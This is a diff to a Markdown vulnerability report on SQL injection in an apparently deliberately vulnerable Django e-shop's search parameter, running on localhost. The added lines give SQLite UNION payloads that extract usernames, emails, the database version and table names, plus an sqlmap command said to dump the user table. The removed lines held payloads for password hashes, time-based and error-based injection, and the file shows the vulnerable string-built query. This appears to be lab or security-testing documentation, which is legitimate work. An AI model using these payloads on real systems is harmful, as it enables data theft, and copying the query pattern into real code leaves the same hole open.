@@ -12,7 +12,7 @@
 ### Vulnerable Code
 ```python
 raw_query = f"""
-SELECT id, name, description, price, stock, created_at, updated_at 
+SELECT id, name, description, price, created_at, updated_at 
 FROM eshop_product 
 WHERE name LIKE '%%{search_query}%%' 
 OR description LIKE '%%{search_query}%%'
@@ -29,24 +29,34 @@ The vulnerability exists because user input from the `q` parameter is directly c
 **URL**: `http://localhost:8000/catalog/?q=' OR '1'='1`  
 **Effect**: Returns all products in the database
 
-### 2. Union-Based Injection
-**Payload**: `' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--`  
-**URL**: `http://localhost:8000/catalog/?q=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--`  
-**Effect**: Extracts usernames and password hashes
+### 2. Union-Based Injection (SQLite - 6 columns)
+**Payload**: `' UNION SELECT '11111111-1111-1111-1111-111111111111', username, email, 0, date_joined, last_login FROM eshop_customuser --`  
+**URL**: `http://localhost:8000/catalog/?q=' UNION SELECT id, username, email, 0, date_joined, last_login FROM eshop_customuser --`  
+**Effect**: Extracts usernames and emails from user table
 
-### 3. Time-Based Blind Injection
-**Payload**: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`  
-**Effect**: Causes 5-second delay if condition is true
+### 3. SQLite Version Extraction
+**Payload**: `' UNION SELECT '11111111-1111-1111-1111-111111111111', sqlite_version(), 'Version', 0, '2024-01-01', '2024-01-01' --`  
+**Effect**: Reveals SQLite database version
 
-### 4. Error-Based Injection
-**Payload**: `' AND 1=CAST((SELECT version()) AS int)--`  
-**Effect**: Database version disclosed in error message
+### 4. Table Enumeration
+**Payload**: `' UNION SELECT '11111111-1111-1111-1111-111111111111', name, 'Table', 0, '2024-01-01', '2024-01-01' FROM sqlite_master WHERE type='table' --`  
+**Effect**: Lists all table names in the database
 
 ## Proof of Concept
 
-### Using SQLMap
+### Using SQLMap (Confirmed Working)
 ```bash
-sqlmap -u "http://localhost:8000/catalog/?q=test" \
+# This command successfully dumps the user table
+sqlmap -u "http://localhost:8000/?q=test" \
+       --cookie="sessionid=YOUR_SESSION_ID" \
+       --batch \
+       --threads 8 \
+       -T eshop_customuser \
+       --dump
+
+# Basic detection
+sqlmap -u "http://localhost:8000/?q=test" \
+       --cookie="sessionid=YOUR_SESSION_ID" \
        --batch \
        --risk=3 \
        --level=5 \
